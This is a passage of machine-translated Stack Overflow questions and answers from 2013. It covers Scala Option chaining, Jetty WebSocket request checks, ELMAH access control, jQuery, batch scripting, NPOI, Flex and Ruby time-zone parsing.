这将返回一个`Option[Int]`（前提是`numberOfSmth`返回一个`Int`）。如果调用链中的任何选项是`None`，则结果将是`None`，否则它将是`Some(count)`where`count`的返回值`numberOfSmth`。

当然，这会很快变得丑陋。出于这个原因，scala 支持*将理解*作为语法糖。上式可以改写为：

```
for { 
  first <- First
  second <- first .second
  third <- second.third
} third.numberOfSmth 
```

可以说哪个更好（特别是如果您还不习惯在任何地方看到`map`/ `flatMap`，使用 scala 一段时间后肯定会出现这种情况），并在引擎盖下生成完全相同的代码。

有关更多背景信息，您可以查看另一个问题：[Scala 的产量是多少？](https://stackoverflow.com/questions/1052476/can-someone-explain-scalas-yield)

**更新**：感谢 Ben James 指出 flatMap 是关联的。换句话说`x flatMap(y flatMap z)))`，与 相同`x flatMap y flatMap z`。虽然后者通常不短，但它具有避免任何嵌套的优点，这更容易遵循。

这是 REPL 中的一些说明（4 种样式是等价的，前两种使用 flatMap 嵌套，另外两种使用 flatMap 的扁平链）：

```
scala> val l = Some(1,Some(2,Some(3,"aze")))
l: Some[(Int, Some[(Int, Some[(Int, String)])])] = Some((1,Some((2,Some((3,aze))))))
scala> l.flatMap(_._2.flatMap(_._2.map(_._2)))
res22: Option[String] = Some(aze)
scala> l flatMap(_._2 flatMap(_._2 map(_._2)))
res23: Option[String] = Some(aze)
scala> l flatMap(_._2) flatMap(_._2) map(_._2)
res24: Option[String] = Some(aze)
scala> l.flatMap(_._2).flatMap(_._2).map(_._2)
res25: Option[String] = Some(aze) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-02-27T12:03:37.810

不需要scalaz：

```
for { 
  first  <- yourFirst
  second <- f.second
  third  <- second.third
  number <- third.numberOfSmth
} yield number 
```

或者，您可以使用嵌套的 flatMaps

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-27T12:03:23.273

这可以通过链接调用来完成`flatMap`：

```
def getN(first: Option[First]): Option[Int] =
  first flatMap (_.second) flatMap (_.third) flatMap (_.numberOfSmth) 
```

您也可以使用 for-comprehension 来执行此操作，但它更冗长，因为它会强制您命名每个中间值：

```
def getN(first: Option[First]): Option[Int] =
  for {
    f <- first
    s <- f.second
    t <- s.third
    n <- t.numberOfSmth
  } yield n 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T12:04:27.860

*我认为这对您的问题来说是一种矫枉过正，但只是作为一般参考：*

这个嵌套访问问题通过一个称为 Lenses 的概念来解决。它们提供了一种通过简单组合访问嵌套数据类型的良好机制。作为介绍，您可能想要检查例如[这个 SO answer](https://stackoverflow.com/a/5597750/1804173)或[this tutorial](https://blog.stackmob.com/2012/02/an-introduction-to-lenses-in-scalaz/)。在您的情况下使用 Lenses 是否有意义的问题是您是否还必须在嵌套选项结构中执行大量更新（注意：*更新*不是可变的，而是返回一个新的修改但不可变的实例）。如果没有 Lenses，这会导致冗长的嵌套案例类`copy`代码。如果您根本不需要更新，我会坚持[om-nom-nom 的建议](https://stackoverflow.com/a/15111652/1804173)。

# websocket - 码头 9 WebSocketListener，beforeConnect

> ID：15111571
> 
> 赞同：0
> 
> 时间：2013-02-27T12:00:17.687
> 
> 标签：websocket, jetty

WebSocketListener 可以提供 beforeWebSocketConnect 方法吗？

我想在打开套接字之前检查请求参数是否正确，如果不正确则拒绝连接。

但是，有没有办法取消协议切换？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T15:53:28.887

从 Jetty 9 开始，您可以使用[WebSocketCreator](http://download.eclipse.org/jetty/stable-9/apidocs/org/eclipse/jetty/websocket/servlet/WebSocketCreator.html)概念来实现此行为。

```
package org.eclipse.jetty.websocket.server.examples;

import java.io.IOException;

import org.eclipse.jetty.websocket.api.UpgradeRequest;
import org.eclipse.jetty.websocket.api.UpgradeResponse;
import org.eclipse.jetty.websocket.server.examples.echo.BigEchoSocket;
import org.eclipse.jetty.websocket.servlet.WebSocketCreator;
import org.eclipse.jetty.websocket.servlet.WebSocketServlet;
import org.eclipse.jetty.websocket.servlet.WebSocketServletFactory;

@SuppressWarnings("serial")
public class MyCustomCreationServlet extends WebSocketServlet
{
    public static class MyCustomCreator implements WebSocketCreator
    {
        @Override
        public Object createWebSocket(UpgradeRequest req, UpgradeResponse resp)
        {
            String query = req.getQueryString();

            // Start looking at the UpgradeRequest to determine what you want to do
            if ((query == null) || (query.length() <= 0))
            {
                try
                {
                    // Let UPGRADE request for websocket fail with
                    // status code 403 (FORBIDDEN) [per RFC-6455]
                    resp.sendForbidden("Unspecified query");
                }
                catch (IOException e)
                {
                    // An input or output exception occurs
                    e.printStackTrace();
                }

                // No UPGRADE
                return null;
            }

            // Create the websocket we want to
            if (query.contains("bigecho"))
            {
                return new BigEchoSocket();
            }
            else if (query.contains("echo"))
            {
                return new MyEchoSocket();
            }

            // Let UPGRADE fail with 503 (UNAVAILABLE)
            return null;
        }
    }

    @Override
    public void configure(WebSocketServletFactory factory)
    {
        factory.setCreator(new MyCustomCreator());
    }
} 
```

# asp.net-mvc - 使用自定义 RoleProvider 限制对 ELMAH 的访问

> ID：15111579
> 
> 赞同：1
> 
> 时间：2013-02-27T12:00:35.617
> 
> 标签：asp.net-mvc, security, attributes, elmah, elmah.mvc

在我的 mvc 项目中，我为异常处理设置了 ELMAH。ELMAH 带有一个可以通过“/elmah.axd”访问的前端。

在 web.config 中配置如下：

```
<location path="elmah.axd">  
        <system.web>
            <httpHandlers>
                <add verb="POST,GET,HEAD" 
                     path="elmah.axd" 
                     type="Elmah.ErrorLogPageFactory, Elmah" />
            </httpHandlers>

            <authorization>
              <allow roles="ADMIN" /> <!-- instead i want to use 'permission' from my custom RoleProvider -->
              <deny users="*"/> 
            </authorization>
        </system.web>
        <system.webServer>
            <handlers>
                <add name="ELMAH" 
                     verb="POST,GET,HEAD"
                     path="elmah.axd" 
                     type="Elmah.ErrorLogPageFactory, Elmah"
                     preCondition="integratedMode" />
            </handlers>
        </system.webServer>
    </location> 
```

如果我使用标准 RoleProvider，我将使用上面示例中指定的授权。但由于我有一个自定义 RoleProvider，我不能/不知道该怎么做。对于我的视图，我实现了一个自定义身份验证属性，它与 [Authorize] 属性非常相似（但取而代之的是权限......）。现在我想使用我的自定义 RoleProvider 指定“elmah.axd”（不是物理文件）的可访问性。

有谁知道我如何实现我的目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T10:12:05.930

[这](http://dotnetslackers.com/articles/aspnet/Securing-ELMAH-with-Independent-HTTP-Authentication.aspx)似乎是一个可行的方法......

# c# - 运行时的 C# 反射

> ID：15111582
> 
> 赞同：1
> 
> 时间：2013-02-27T12:00:38.403
> 
> 标签：c#, reflection

我想通过另一个项目获取有关某个项目的字段、函数和线程的信息。

作为一个我想探索的示例项目，我创建了一个初始化为 1 的字段 int x。Main 调用函数将 x 的值更改为 2。我将 Main 卡在一个无限循环中。我运行了这个项目。

第二个项目：获取第一个项目的EXE文件的路径，并加载程序集。通过反思，我得到了部门、职能和领域的名称。我试图通过函数 getValue 打印字段 x 的值。不是打印 2，而是打印 1。即，反射指的是编译时的值，而不是运行时的值。

我应该怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:05:29.087

您无法在其他进程中获得内存中的新值。

但是，使用反射，您可以加载该程序集，创建该类的实例并显式调用 Main，然后检查 int 的值，因为这样代码将由您的进程运行。

**不要**期望能够使用反射从另一个应用程序的内存空间中嗅出值，这不是反射所做的。

# jquery - 当 JSP 位于 WEB-INF 文件夹下时，如何使用 Jquery.load() 函数加载 JSP？

> ID：15111588
> 
> 赞同：2
> 
> 时间：2013-02-27T12:00:49.607
> 
> 标签：jquery, jsp

这是我在项目中的目录结构

```
WebContent
 --resources
 --WEB-INF
   --classes
   --jsp
     dashboard.jsp
     home.jsp
   --lib 
```

我想使用 Jquery 方法在 dashboard.jsp 中加载 home.jsp

$("#result").load("home.jsp");

但它不起作用。我相信，我在加载方法中引用 home.jsp 页面的方式不正确。如何调用位于 WEB-INF/jsp 文件夹下的 home.jsp（来自dashboard.jsp）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:29:15.000

如评论中所述，无法通过 url 访问 WEB-INF 文件夹中的任何文件。但是你也许可以通过 jsp:include 访问它

```
<jsp:include page="WEB-INF/home.jsp" /> 
```

*（我只是不知道这是否有效，但如果适用，值得一试）*

url 总是相对于“组合”的 URL（因为缺少更好的词）。因此，如果您通过 servlet 访问 .jsp 文件：

```
request.getRequestDispatcher("/WEB-INF/dashboard.jsp").forward(request, response); 
```

您引用表单的 url 实际上是您的 servlet 的 URL。

考虑到这一点，URL*将是* `$("#result").load("/WEB-INF/home.jsp")`，但由于整个 WEB-INF 文件夹无法从任何地方访问，除了 Servlet（然后只能分派给它们），您无法从 jquery 访问 home.jsp。

因此，要为您的问题提供解决方案：

任何一个

*   将 home.jsp 从 WEB-INF 文件夹中取出，
*   创建一个分派给它的 Servlet，
*   试试 jsp:include

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T12:03:11.400

```
$("#result").load("/home.jsp"); 
```

# xcode - 精简版应用程序然后需要注册

> ID：15111596
> 
> 赞同：0
> 
> 时间：2013-02-27T12:01:12.020
> 
> 标签：xcode

我有一个非常昂贵的应用程序，专门用于婚礼行业。我的目标是尝试和限制非法分发。我想过免费提供它，但上面有一个大水印。用户必须注册并付费才能将其删除。两个问题。这可能吗？而且，如果是这样，我需要向用户提供特定于设备序列号的“解锁码”，这样一个序列号就不能在另一台设备上工作，因为它是一个基于公式的序列号，它使用设备的序列号。我会手动生成这个解锁码。我只是想知道这是否可能。请记住，这个应用程序不适合一大群人。这是一个特定的群体，所以我不关心让用户感到困难。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:07:25.313

我认为 Apple 不会允许这样的应用在 App Store 上销售。这是因为如果您提供免费版本，则不允许显着削弱其功能，而添加大水印就可以了。苹果还希望通过应用内购买而不是某些专有方案来解锁应用。

# jquery - 为什么 .slideUp() 之后没有触发 .show()？

> ID：15111598
> 
> 赞同：1
> 
> 时间：2013-02-27T12:01:19.257
> 
> 标签：jquery, html

我正在优雅地尝试在上传后关闭文件列表 div。

```
uploader.bind('UploadComplete', function(up, files) {
    jQuery('#filelist').delay(500).slideUp('slow').promise().done(function(){
        jQuery('#filelist .file_name').remove();
    }).show();
}); 
```

`.slideUp()`将样式添加`style="display: none;"`到我的 div。我试图通过在触发`.show()`后调用来删除它。`.slideUp()`但似乎a）我不太了解jQuery是如何工作的，b）把它放在`.show()`了错误的地方。

谁能告诉我如何解决这个问题？谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:02:43.063

只是一个例子，假设你有一个`display:none;`元素`.hidden`：

```
$('.hidden').fadeTo(3000, 1).hide(); // will never fade
$('.hidden').hide().fadeTo(3000, 1); // will fade ! 
```

```
uploader.bind('UploadComplete', function(up, files) {
    jQuery('#filelist').delay(500).slideUp('slow').promise().done(function(){
        jQuery('#filelist .file_name').remove();
        jQuery('#filelist').show(); // PUT INSIDE CALLBACK
    });
}); 
```

# javascript - 由于 CMS 输出导致的 JQuery Accordion 问题

> ID：15111601
> 
> 赞同：1
> 
> 时间：2013-02-27T12:01:26.440
> 
> 标签：javascript, jquery, ajax, content-management-system, accordion

由于我使用 CMS 输出导航项的方式，我遇到了问题。我以前问过这个问题，并且收到了一个应该可以工作的解决方案，但是由于 JS 不是我的强项，我不明白。简短的背景。我的 CMS 输出一个菜单项，例如：

```
<ul id="amenu">
    <li><a href="#">Home</a></li><li><span class="currentbranch0">
        <a href="">Content</a></span>
        <ul class="multilevel-linkul-0" title="">
            <li><a href="">Content 2</a></li>
            <li><span class="currentbranch1"><a href="">Content 3</a></span></li>
        </ul>
    </li>
</ul> 
```

问题出在哪里？CMS 在一个范围内输出活动选择器类，并根据级别增加它，从代码中可以看出 currentbranchN。

我在另一个线程上收到了帮助，我们已经到了这一点：

```
$(document).ready(function () {
  $('#amenu > li > a').click(function(){
    if ($(this).closest("span[class*='currentbranch']").attr('class') != 'active'){
      $('#amenu li ul').slideUp();
      $(this).next().slideToggle();
      $('#amenu li a').closest("span[class*='currentbranch']").removeClass('active');
      $(this).closest("span[class*='currentbranch']").addClass('active');
    }
  });
}); 
```

但它不能用作手风琴，请在此处查看 JSFiddle：http: [//jsfiddle.net/EKe2R/5/](http://jsfiddle.net/EKe2R/5/)。我认为我已经接近让它工作了，但由于我的 JS 技能充其量是基本的，我似乎无法理解它。我基本上需要扩展菜单（如果选择了第二级项目）并使用 CMS 输出的导航项目突出显示活动对象 currentbranch1。

谢谢！:)

缺口

编辑：除此之外，手风琴不起作用的主要问题是，即使对于第二级，CMS 也会输出第一级，导致代码失败

```
<span class="currentbranch0"></span> 
```

编辑：：

我将尝试对滑下的东西进行硬编码，这是我尝试过的代码，但它失败了：

```
$(document).ready(function () {
  $('#amenu > li > a,#amenu > li > span > a').click(function(){
      //alert($(this).closest("span[class='currentbranch0']").attr('class'));
    if ($(this).closest("span[class='currentbranch0']").attr('class') != 'active'){
      $('#amenu li ul').slideUp();
      $(this).parents('li').children('ul').slideDown();
      $('#amenu li a').closest("span[class='currentbranch0']").removeClass('active');
      $(this).closest("span[class='currentbranch0']").addClass('active');
    }
  });
}); 
```

[http://jsfiddle.net/GgKyV/1/](http://jsfiddle.net/GgKyV/1/)小提琴在这里

另外，如果选择了链接，我如何让小提琴自动打开手风琴，第一级 lis 将是指向网页内容的实际链接，而不是虚拟链接

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:16:41.570

您正在选择作为 li 元素的第一个子元素的锚链接

```
$('#amenu > li > a') 
```

但在您的 HTML 中，锚链接是第二个孩子

```
<li><span class="currentbranch1"><a href="">Content 3</a></span></li> 
```

此外，您的方法无法检查活动类，但您可以通过 hasClass 函数检查它。

看看这个小提琴是否适合你

[http://jsfiddle.net/fdcd6/1/](http://jsfiddle.net/fdcd6/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T13:19:28.060

您是否期待以下结果。请检查以下链接。

[http://jsfiddle.net/EKe2R/11/](http://jsfiddle.net/EKe2R/11/)

只有js代码改变了。

```
 $(document).ready(function () {
      $('#amenu > li > a,#amenu > li > span > a').click(function(){
          //alert($(this).closest("span[class*='currentbranch']").attr('class'));
        if ($(this).closest("span[class*='currentbranch']").attr('class') != 'active'){
          $('#amenu li ul').slideUp();
          $(this).parents('li').children('ul').slideDown();
          $('#amenu li a').closest("span[class*='currentbranch']").removeClass('active');
          $(this).closest("span[class*='currentbranch']").addClass('active');
        }
      });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T13:25:58.297

用这个...

```
 $('.currentbranch0').on('click', function(){
       $(this).next().slideToggle('slow');
  }); 
```

并查看此[jSfiddle 示例](http://jsfiddle.net/EKe2R/14/)

# ios - MPMoviePlayerController 中的控件已禁用

> ID：15111604
> 
> 赞同：0
> 
> 时间：2013-02-27T12:01:29.657
> 
> 标签：ios, mpmovieplayercontroller

这是我的代码：

```
-(void) playVideo
{
    self.moviePlayer = [[MPMoviePlayerController alloc] initWithContentURL:self.criteriaFilter.videoUrl];
    [self.moviePlayer prepareToPlay];
    [self.moviePlayer.view setFrame:self.displayVideoView.bounds];
    self.moviePlayer.shouldAutoplay = YES;
    [self.displayVideoView addSubview:self.moviePlayer.view];

} 
```

在纵向模式下，控件工作正常（播放、暂停、全屏）。但是在横向模式下，所有按钮似乎都被禁用了。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:48:26.123

对于您在评论中描述的问题，可以通过在您的代码中添加此代码来解决。

```
self.moviePlayer.view.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight; 
```

# security - SSPI 的 INDY TIdHttp 集成安全身份验证问题

> ID：15111605
> 
> 赞同：4
> 
> 时间：2013-02-27T12:01:32.227
> 
> 标签：security, delphi, indy

我正在尝试调用应用了 Windows 身份验证安全性的 IIS 上托管的 Web 服务。

我将 Delphi XE 与 INDY 10 和 TIdHttp 组件一起使用。

如果我传入有效的用户名和密码，我可以成功调用 Web 服务，但我想使用集成安全性，以便它自动使用来自调用线程的凭据，并且不需要用户手动输入他们的详细信息。

我在 uses 子句中包含了 IdAuthenticationSSPI 并将 http 请求称为：

```
IdHttp1.Request.BasicAuthentication := False;
IdHttp1.HTTPOptions := [hoInProcessAuth];
// IdHttp1.Request.Username := '...'; // including this works
// IdHttp1.Request.Password := '...'; // including this works

IdHttp1.Get(myURL, myOutputStream); 
```

我的理解是，使用 IdAuthenticationSSPI 如果没有传递凭据，它将模拟调用线程的用户。

我在[atozedsoftware.newsgroups](http://atozedsoftware.newsgroups.archived.at/indy.protocol.http/201001/1001273074.html)网站上看到评论表明这是可能的，但不幸的是我得到了“HTTP/1.1 401 Unauthorized”。

有没有人有什么建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-28T10:13:11.027

根据 Remy Lebeau 的评论，在已知问题得到解决之前，INDY 似乎无法做到这一点。

我已经以另一种方式解决了我的问题，我会在这里发布以防其他人感兴趣。

首先，我导入了 WinHTTP 类型库 (C:\Windows\system32\winhttp.dll) 并将 WinHttp_TLB 添加到使用子句中。

然后我像这样使用它：

```
var
    http: IWinHttpRequest;
    url: String;
begin
    url := 'my web service';
    http := CoWinHttpRequest.Create;
    try
        http.SetAutoLogonPolicy(0); // Enable SSO
        http.Open('GET', url, False);
        http.Send(EmptyParam);
        ShowMessage(http.ResponseText);
    finally
        http := nil;
    end;
end; 
```

# cmd - 在 Windows shell 中的运行时扩展环境变量

> ID：15111608
> 
> 赞同：0
> 
> 时间：2013-02-27T12:01:44.720
> 
> 标签：cmd, environment-variables, windows-shell

我在以下示例中遇到了麻烦。我有一个包含文件名列表的文件。我想检查这些文件是否存在，例如：

```
%ProgramFiles%\Internet Explorer\iexplore.exe
%SystemRoot%\sdfsdfsd.exe
%SystemRoot%\explorer.exe 
```

每个路径都包含环境变量。

我的`bat`文件示例：

```
echo off  
for /f "tokens=*" %%a in (filelist.txt) do (  
  if exist "%%~a" (  
    echo %%~a exists  
  ) else (  
    echo %%~a doesn't exists  
  )  
) 
```

文件名已正确加载，但我 cmd 找不到所有文件。我认为 cmd 处理器不会在路径中扩展环境变量......我该怎么做？或者可能还有其他问题。

或者我如何在变量中替换`!`为其他？`%`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T15:38:06.470

尝试使用 a`call`来强制评估文本文件中的变量。

```
@echo off
setlocal
for /f "tokens=*" %%a in (filelist.txt) do (
    call :checkExists "%%~a"
)
goto :EOF

:checkExists <filename>
if exist %1 (
    echo %~1 exists
) else (
    echo %~1 doesn't exists
)
goto :EOF 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T20:18:05.990

[rojo](https://stackoverflow.com/a/15116071/1630171)已经有了正确的想法，但没有必要求助于子程序。当与例如命令`call`一起使用时，也会导致嵌套变量的扩展。`set`

```
@echo off

setlocal EnableDelayedExpansion

for /f "tokens=*" %%a in (filelist.txt) do (
  call set fname=%%~a
  if exist "!fname!" (
    echo %%~a exists.
  ) else (
    echo %%~a doesn't exist.
  )
)

endlocal 
```

**编辑：**正如@dbenham 所指出的，上述代码中的延迟扩展将导致感叹号从文件名中消失。这可以通过`setlocal EnableDelayedExpansion`在循环内移动指令并在前面加上`call set`a`setlocal DisableDelayedExpansion`以防止`%fname%`泄漏到循环外来缓解。

```
@echo off

for /f "tokens=*" %%a in (filelist.txt) do (
  setlocal DisableDelayedExpansion
  call set fname=%%~a
  setlocal EnableDelayedExpansion
  if exist "!fname!" (
    echo %%~a exists.
  ) else (
    echo %%~a doesn't exist.
  )
  endlocal
) 
```

# c# - 使用比较列表对列表进行排序

> ID：15111612
> 
> 赞同：1
> 
> 时间：2013-02-27T12:01:49.553
> 
> 标签：c#, list, sorting

需要在c#中做这样的事情我在java中做：

```
Double[][] matrix = new Double[3][4];

        matrix[0][0] = 100.0;
        matrix[0][1] = -3.0;
        matrix[0][2] = 50.0;
        matrix[0][3] = 50.3;

        matrix[1][0] = 1.2;
        matrix[1][1] = 1.1;
        matrix[1][2] = 0.9;
        matrix[1][3] = 10000.0;

        matrix[2][0] = 2.3;
        matrix[2][1] = 2.35;
        matrix[2][2] = 2.32;
        matrix[2][3] = 2.299;

        Arrays.sort(matrix, new Lexical()); 
```

我一直在看 MSDN 文档，除了排序 List 没有任何方法，没有任何`List<List<T>>`.

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:34:40.957

乔治。

一种可能的解决方案：

```
matrix.Sort(delegate(List<double> l1, List<double> l2)
            {
               return l1[0].CompareTo(l2[0]);
            }); 
```

再见。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:08:34.813

您可以实现自己的 IComparer 并进行排序，或者您可以使用 Linq 做一些事情，这基本上会遍历整个矩阵并对其进行排序，或者您可以将其全部转换为另一个数据结构，例如 List>，然后您可以轻松地进行排序.

或者是这样的：

[如何在 C# 中对二维数组进行排序？](https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c)

[http://www.codeproject.com/Tips/166236/Sorting-a-two-dimensional-array-in-C](http://www.codeproject.com/Tips/166236/Sorting-a-two-dimensional-array-in-C)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:36:04.267

您可以按每个数组的第一个元素排序（如果这是您所要求的）：

```
var matrix = new double[][] {
    new[] { 100.0, -3.0, 50.0, 50.3 },
    new[] { 1.2, 1.1, 0.9, 10000.0 },
    new[] { 2.3, 2.35, 2.32, 2.299}
};

Array.Sort(matrix, (a, b) => a[0].CompareTo(b[0])); 
```

# actionscript-3 - 从动作脚本访问 mxml 中的元素

> ID：15111616
> 
> 赞同：0
> 
> 时间：2013-02-27T12:02:03.317
> 
> 标签：actionscript-3, apache-flex, mxml, flex-spark

我有一个如下的 mxml 应用程序。如何从 actionscript 文件中更改标签文本？

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" creationComplete="initApp()">
    <fx:Script>
        <![CDATA[
            public function initApp(){
                var p = new my_player("a");
            }
        ]]>
    </fx:Script>
    <s:Label x="700" y="409" text="Label" id="lble" width="131" height="41"/>
</s:Application> 
```

my_player.as 代码

```
package 
{
    import spark.components.Label;
    public class my_player
    {
        public var lble:Label;
        public function my_player(a:String)
        {
            lble.text="hello";
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T14:58:49.487

使用构造函数将标签从主应用程序注入到传送播放器（另一种方式 - 绑定）

```
public function initApp(){
    var p = new my_player("a", lble);
} 
```

* * *

```
public function my_player (a:String, targetLabel:Label)
{
    lble = targetLabel;
    lble.text="hello";
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T14:37:06.143

你不需要第二节课:(

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application 
    xmlns:fx="http://ns.adobe.com/mxml/2009"
    xmlns:s="library://ns.adobe.com/flex/spark" 
    xmlns:mx="library://ns.adobe.com/flex/mx" 
    creationComplete="initApp()">
    <fx:Script>
        <![CDATA[
        public function initApp(){

            // access your components by id
            lble.text  = "My new text for the label"
        }
        ]]>
    </fx:Script>
    <s:Label x="700" y="409" text="Label" id="lble" width="131" height="41"/>
</s:Application> 
```

# php - 使用 smarty 在 javascript 中生成多维数组的定义

> ID：15111618
> 
> 赞同：0
> 
> 时间：2013-02-27T12:02:06.580
> 
> 标签：php, javascript, multidimensional-array, smarty, json

抱歉，但我不是 JS 大师，而且我对此一无所知。如何在 javascript 输出中使用 smarty 生成 multidmensionall 数组。

```
var kreator_elements = new Array();

{foreach $kreator_elements as $element}

if(!kreator_elements[{$element->id_atrib}] instanceof Array)
    var kreator_elements[{$element->id_atrib}] = new Array();

kreator_elements[{$element->id_atrib}][{$element->id}] = new Array();
kreator_elements[{$element->id_atrib}][{$element->id}]['u_img'] = '{$element->getImageLink()}';
kreator_elements[{$element->id_atrib}][{$element->id}]['u_ico'] = '{$element->getIconLink()}';

{/foreach} 
```

尝试了几种方法，使用 [] 等。目前它们都不适合我。在控制台中总是会出现某种错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:10:21.193

尝试在纯 PHP 中构建关联数组，而不是使用 Smarty：

```
$tmp = array();
foreach ($kreator_elements as $element) {
    $tmp[$element->id_atrib][$element->id] = array(
        'u_img' => $element->getImageLink(),
        'u_ico' => $element->getIconLink()
    );
}
$kreator_elements_json = json_encode($tmp); 
```

确保所有字符串都是 UTF-8 编码的，否则 json_encode 将失败。如果没有，请在每个非 Unicode 字符串上运行 iconv()。

结果可以回显，因为它是正确的 javascript 对象并且不需要 smarty。

在用另一种语言构建一种语言时，请始终尝试使用尽可能少的语言。如果您真的必须这样做，请记住转义每个字符串，因为只有一个 ' 符号或换行符可能会导致生成的代码出现语法错误。

# c# - NPOI 导出日期时间问题

> ID：15111619
> 
> 赞同：0
> 
> 时间：2013-02-27T12:02:07.733
> 
> 标签：c#, npoi

我使用 NPOI 进行了导出。
我设置单元格值：

```
row.CreateCell(6).SetCellValue("This is date string"); 
```

现在，excel 将此视为一个文本字段，我需要将单元格类型设置为`DateTime`.
这可能吗？
我努力了：

```
row.CreateCell(6).SetCellValue(DateTime.Parse("This is date string")); 
```

但不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:28:29.443

```
private void AddRecords( Sheet sheet, IList<T> records )
{
    foreach( var record in records )
    {
        // append row
        var row = sheet.CreateRow ( sheet.LastRowNum + 1 );

        // iterate through all configured columns
        foreach ( var column in GetColumns() )
        {
            // append cell
            Cell cell = row.CreateCell ( row.LastCellNum == -1 ? 0 : row.LastCellNum );

            object value = GetCellValue ( column, record );
            cell.SetCellValue ( value );
            string dataFormat = column.DataFormat ??"m/d";
            cell.CellStyle = GetCellStyleForFormat( sheet.Workbook, dataFormat );
        }
    }
}

private readonly Dictionary<string, CellStyle> _cellStyleCache = new Dictionary < string, CellStyle > ();

private CellStyle GetCellStyleForFormat( Workbook workbook, string dataFormat )
{
    if( !_cellStyleCache.ContainsKey ( dataFormat ) )
    {
        var style = workbook.CreateCellStyle ();

        // check if this is a built-in format
        var builtinFormatId = HSSFDataFormat.GetBuiltinFormat ( dataFormat );

        if( builtinFormatId != - 1)
        {
            style.DataFormat = builtinFormatId;
        }
        else
        {
            // not a built-in format, so create a new one
            var newDataFormat = workbook.CreateDataFormat ();
            style.DataFormat = newDataFormat.GetFormat ( dataFormat );
        }

        _cellStyleCache[dataFormat] = style;
    }
} 
```

# ruby-on-rails - ruby 版本之间的时区解析差异

> ID：15111621
> 
> 赞同：2
> 
> 时间：2013-02-27T12:02:10.480
> 
> 标签：ruby-on-rails, ruby, timezone

在我的本地机器上，我使用的是 RVM

```
>> ruby -v
=> ruby 1.9.3p194 (2012-04-20 revision 35410) [i686-linux]

# in the terminal
>> date
=> Wed Feb 27 20:00:17 PHT 2013 
```

在我们的登台服务器中，我们使用的是 rbenv

```
>> ruby -v
=> ruby 1.9.3p194 (2012-04-20 revision 35410) [x86_64-linux]

# in the terminal
>> date
=> Wed Feb 27 12:00:22 UTC 2013 
```

在我的本地机器中，我正在解析来自 ajax 调用的日期字符串

```
>> Time.zone
=> (GMT+00:00) UTC
>> Time.zone.parse('Wed Feb 27 2013 19:46:21 GMT+0800 (PHT)')
=> Wed, 27 Feb 2013 19:46:21 UTC +00:00 
```

在我们的登台服务器中，我得到了不同的结果

```
>> Time.zone
=> (GMT+00:00) UTC
>> Time.zone.parse('Wed Feb 27 2013 19:46:21 GMT+0800 (PHT)')
=> Wed, 27 Feb 2013 11:46:21 UTC +00:00 
```

有什么想法可以让登台服务器上的解析结果识别时区吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:58:34.093

Javascript 和 Ruby 不使用相同的时间格式，因此存在差异。Javascript 使用的一个（RFC 1123）已过时，并且被一些（但不是全部！）Ruby 日期时间解析方法实现读取错误，它需要类似 RFC 2822 或 ISO 8601 的内容。通过将 Javascript 输出到ISO 格式。

## 为什么

[`ActiveSupport::TimeZone#parse`](http://api.rubyonrails.org/classes/ActiveSupport/TimeZone.html#method-i-parse)您正在使用的，在内部`Time::parse`直接使用字符串来获取时间，然后将其放入所需的时区。

在您的情况下，您的字符串是由默认的 javascript 方法输出的，该方法`Date.prototype.toString`通常提供 RFC 1123 格式（但因实现而异），这对于[RFC2822](https://www.rfc-editor.org/rfc/rfc2822#section-3.3)和[ISO8601](http://en.wikipedia.org/wiki/ISO_8601)来说大多已过时。

### 关于不同时间标准的说明（RFC、RFC、RFC！）

RFC1123 允许用“GMT”字符串表示时区，例如“GMT+0800”，而[RFC2822](https://www.rfc-editor.org/rfc/rfc2822#section-3.3)弃用该字符串以支持统一的 UTC 表示“+0800”，而不用说“GMT”/“UT”。ISO8601 更加紧凑（例如`20130227T0914-0500`），因此也不允许说“GMT”。

### 回到我们的红宝石

因此，`Time::parse`使用[`Time::zone_offset`](http://ruby-doc.org/stdlib-1.9.3/libdoc/time/rdoc/Time.html#method-c-zone_offset)的 ，无法识别该时区信息（特别是与“GMT”混淆），并回退到系统时区。

## 使用标准时间格式

